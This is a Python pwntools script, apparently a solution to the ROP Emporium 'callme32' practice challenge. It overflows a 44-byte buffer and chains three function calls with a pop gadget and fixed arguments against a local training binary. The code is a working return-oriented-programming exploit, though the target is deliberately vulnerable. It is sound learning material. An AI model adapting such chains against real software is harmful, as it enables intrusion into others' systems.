#!/usr/bin/env python3
##CALLME32
from pwn import *

context(os='linux', arch='i386')
offset = 44

callme1 = p32(0x080484f0)
callme2 = p32(0x08048550)
callme3 = p32(0x080484e0)
pop_gadget = p32(0x080487f9) #pop esi; pop edi; pop ebp; ret;

arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)

pad = b'A' * offset

payload = pad
# ogni blocco: [call][pop_gadget][arg1][arg2][arg3]
payload += callme1 + pop_gadget + arg1 + arg2 + arg3
payload += callme2 + pop_gadget + arg1 + arg2 + arg3
payload += callme3 + pop_gadget + arg1 + arg2 + arg3

p = process("./callme32")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors='ignore'))
# oppure p.interactive()
